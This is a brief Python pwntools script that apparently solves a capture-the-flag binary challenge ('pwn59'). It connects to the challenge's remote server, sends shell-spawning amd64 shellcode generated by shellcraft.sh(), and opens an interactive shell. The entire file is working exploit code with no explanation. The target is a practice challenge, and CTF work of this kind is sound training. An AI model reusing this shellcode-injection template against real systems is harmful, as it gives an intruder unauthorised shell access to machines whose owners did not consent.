from pwn import *
context(arch='amd64', os='linux')

#p = process('./pwn59')
p = remote('pwn.challenge.ctf.show', 28242)

shellcode = asm(shellcraft.sh())
p.sendline(shellcode)

p.interactive()